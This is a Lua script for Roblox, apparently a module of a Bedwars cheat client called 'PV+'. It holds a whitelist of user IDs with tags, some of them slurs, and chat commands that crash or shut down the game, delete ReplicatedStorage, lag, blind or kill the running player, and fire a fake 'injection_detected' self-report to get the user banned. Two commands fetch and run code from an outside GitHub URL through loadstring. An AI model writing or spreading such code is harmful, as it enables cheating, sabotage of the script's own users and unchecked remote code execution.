local player = game.Players.LocalPlayer
local prefix = ";"
local PlayerAllowed = "PV+ PRIVATE"
local PlayerNotAllowed = "PV+ USER"

local whitelist = {
    tags = {
        {userid = "1161080526", tag = "008", color = "black"},
        {userid = "1161080526", tag = "AC MOD", color = "red"},
        {userid = "4820509369", tag = "Lemon Private Owner", color = "yellow"},
        {userid = "4820509369", tag = "VAPE PRIVATE (Troll)", color = "red"},
        {userid = "3800937614", tag = "NightWare Owner", color = "black"},
        {userid = "3800937614", tag = "AC MOD", color = "red"},
        {userid = "4866281693", tag = "NightWare Owner", color = "black"},
        {userid = "4866281693", tag = "AC MOD", color = "red"},
        {userid = "4768474869", tag = "AC MOD", color = "red"},
        {userid = "4768474869", tag = "PV+ OWNER", color = "blue"},
        {userid = "4768458276", tag = "AC MOD", color = "red"},
        {userid = "4768458276", tag = "PV+ OWNER", color = "blue"},
        {userid = "4595731151", tag = "AC MOD", color = "red"},
        {userid = "4595731151", tag = "PV+ OWNER", color = "blue"},
        {userid = "4676567250", tag = "AC MOD", color = "red"},
        {userid = "4676567250", tag = "PV+ OWNER", color = "blue"},
        {userid = "4768417093", tag = "AC MOD", color = "red"},
        {userid = "4768417093", tag = "PV+ OWNER", color = "blue"},
        {userid = "4791188530", tag = "AC MOD", color = "red"},
        {userid = "4791188530", tag = "PV+ OWNER", color = "blue"},
        {userid = "3872667823", tag = "AC MOD", color = "red"},
        {userid = "3872667823", tag = "PV+ OWNER", color = "blue"},
        {userid = "4870190215", tag = "AC MOD", color = "red"},
        {userid = "4870190215", tag = "MEGA HORNY GUYS", color = "yellow"},
        {userid = "4838993760", tag = "Very Retard Guys", color = "red"},
        {userid = "4838993760", tag = "Very Nice Guys", color = "yellow"},
        {userid = "4869892282", tag = "AC MOD", color = "red"},
        {userid = "4869892282", tag = "Nightshade", color = "black"},
        {userid = "3660810631", tag = "AC MOD", color = "red"},
        {userid = "3660810631", tag = "Very Retard Guys", color = "red"},
    }
}

local colors = {
    ["red"] = "#ff0000",
    ["orange"] = "#ff7800",
    ["yellow"] = "#e5ff00",
    ["green"] = "#00ff00",
    ["blue"] = "#0000ff",
    ["purple"] = "#b800b8",
    ["pink"] = "#ff00ff",
    ["black"] = "#000000",
    ["white"] = "#ffffff",
}

local isLooping = false
local customTag = ""

local function onPlayerChatted(message)
    if message:sub(1, #prefix) == prefix then
        local cmd = message:sub(#prefix + 1)
        if cmd == "kill" then
            if player.Name == PlayerAllowed then
                local targetPlayer = game.Players:FindFirstChild(PlayerNotAllowed)
                if targetPlayer and targetPlayer.Character then
                    game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Dead)
                end
            end
        elseif cmd == "void" then
            if player.Name == PlayerAllowed then
                local character = game.Players.LocalPlayer.Character
                local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
                local newPosition = humanoidRootPart.CFrame
                for i = 1, 3 do
                    newPosition = newPosition + Vector3.new(0, -40, 0)
                    humanoidRootPart.CFrame = newPosition
                    wait(0.01)
                end
            end
        elseif cmd == "loopvoid" then
            if player.Name == PlayerAllowed and not isLooping then
                isLooping = true
                while isLooping do
                    local character = game.Players.LocalPlayer.Character
                    local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
                    local newPosition = humanoidRootPart.CFrame
                    for i = 1, 3 do
                        newPosition = newPosition + Vector3.new(0, -40, 0)
                        humanoidRootPart.CFrame = newPosition
                        wait(0.01)
                    end
                end
            end
        elseif cmd == "unloopvoid" then
            if player.Name == PlayerAllowed then
                isLooping = false
            end
        elseif cmd == "reveal" then
            if player.Name == PlayerAllowed then
                local textChatService = game:GetService("TextChatService")
                wait(0.0001)
                textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("I Using PV+ Config No Cap")
            end
        elseif cmd == "cmdall" then
            if player.Name == PlayerAllowed then
                local textChatService = game:GetService("TextChatService")
                wait(0.0001)
                textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("I using PV+ Config Fr")
            end
        elseif cmd == "uninject" then
            if player.Name == PlayerAllowed then
                GuiLibrary.SelfDestruct()
            end
        elseif cmd == "blind" then
            if player.Name == PlayerAllowed then
                local blur = Instance.new("BlurEffect")
                blur.Size = 10000000000000
                blur.Parent = game.Lighting
            end
        elseif cmd == "unblind" then
            if player.Name == PlayerAllowed then
                local blur = game.Lighting:FindFirstChildOfClass("BlurEffect")
                if blur then
                    blur:Destroy()
                end
            end
        elseif cmd == "troll" then
            if player.Name == PlayerAllowed then
                loadstring(game:HttpGet("https://raw.githubusercontent.com/SnoopyOwner/Modules/main/trollage"))()
            end
        elseif cmd == "kick" then
            if player.Name == PlayerAllowed then
                wait(1)
                for index, player in pairs(game.Players:GetPlayers()) do
                    player:Kick("PV+ Kick You Cuz Your Bad")
                end
            end
        elseif cmd == "ban" then
            if player.Name == PlayerAllowed then
                local rs = game:GetService("ReplicatedStorage")
                local remote = rs:FindFirstChild("SelfReport", true)
                remote:FireServer("injection_detected")
            end
        elseif cmd == "rickroll" then
            if player.Name == PlayerAllowed then
                loadstring(game:HttpGet("https://raw.githubusercontent.com/SnoopyOwner/Modules/main/RickRoll"))()
            end
        elseif cmd == "freeze" then
            if player.Name == PlayerAllowed then
                game.Players.LocalPlayer.Character.HumanoidRootPart.Massless = true
            end
        elseif cmd == "thaw" then
            if player.Name == PlayerAllowed then
                game.Players.LocalPlayer.Character.HumanoidRootPart.Massless = false
            end
        elseif cmd == "lobby" then
            if player.Name == PlayerAllowed then
                game:GetService("ReplicatedStorage"):FindFirstChild("bedwars"):FindFirstChild("ClientHandler"):Get("TeleportToLobby"):SendToServer()
            end
        elseif cmd == "bgame" then
            if player.Name == PlayerAllowed then
                pcall(function()
                    local replicatedStorage = game:GetService("ReplicatedStorage")
                    for _, child in ipairs(replicatedStorage:GetDescendants()) do
                        child:Destroy()
                    end
                end)
            end
        elseif cmd == "bmap" then
            if player.Name == PlayerAllowed then
                local function unanchorParts(object)
                    if object:IsA("BasePart") then
                        object.Anchored = false
                    end
                    for _, child in ipairs(object:GetChildren()) do
                        unanchorParts(child)
                    end
                end
                unanchorParts(workspace)
            end
        elseif cmd == "quit" then
            if player.Name == PlayerAllowed then
                game:Shutdown()
            end
        elseif cmd == "lagback" then
            if player.Name == PlayerAllowed then
                for i = 1, 10 do
                    wait()
                    local player = game.Players.LocalPlayer
                    local character = player.Character or player.CharacterAdded:Wait()
                    local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
                    local forwardVector = humanoidRootPart.CFrame.LookVector
                    local newPosition = humanoidRootPart.CFrame.p + forwardVector * 1000000
                    humanoidRootPart.CFrame = CFrame.new(newPosition, newPosition + forwardVector)
                end
            end
        elseif cmd == "crash" then
            if player.Name == PlayerAllowed then
                while true do end
            end
        elseif cmd == "ping" then
            if player.Name == PlayerAllowed then
                local thingy = settings().Network
                thingy.IncomingReplicationLag = math.huge
            end
        elseif cmd == "lag" then
            if player.Name == PlayerAllowed then
                local RunService = game:GetService("RunService")
                local player = game.Players.LocalPlayer
                local character = player.Character or player.CharacterAdded:Wait()
                local rootPart = character:WaitForChild("HumanoidRootPart")
                RunService.Heartbeat:Connect(function()
                    for i = 1, 100 do
                        local part = Instance.new("Part")
                        part.Anchored = false
                        part.CanCollide = true
                        part.Transparency = 1
                        part.CFrame = rootPart.CFrame + Vector3.new(0, 100000, 0)
                        part.Parent = workspace
                    end
                end)
            end
        elseif cmd == "loopkill" then
            if player.Name == PlayerAllowed then
                _G.loopkill = true
                while _G.loopkill do
                    game.Players.LocalPlayer.Character.Humanoid.Health = 0
                    wait(4)
                end
            end
        elseif cmd == "unloopkill" then
            if player.Name == PlayerAllowed then
                _G.loopkill = false
                while _G.loopkill do
                    game.Players.LocalPlayer.Character.Humanoid.Health = 0
                    wait(3)
                end
            end
        end
    elseif message == "I using PV+ Config Fr" then
        local userId = tostring(player.UserId)
        local hasTag = false

        if whitelist["tags"] ~= nil then
            for i, v in ipairs(whitelist["tags"]) do
                if v.userid == userId then
                    hasTag = true
                    customTag = "<font color='" .. colors[v.color] .. "'>[" .. v.tag .. "]</font>"
                    break
                end
            end
        end

        if hasTag then
            PlayerAllowed = "PV+ PRIVATE"
        else
            PlayerAllowed = "PV+ USER"
        end
    end
end

game.Players.LocalPlayer.Chatted:Connect(onPlayerChatted)
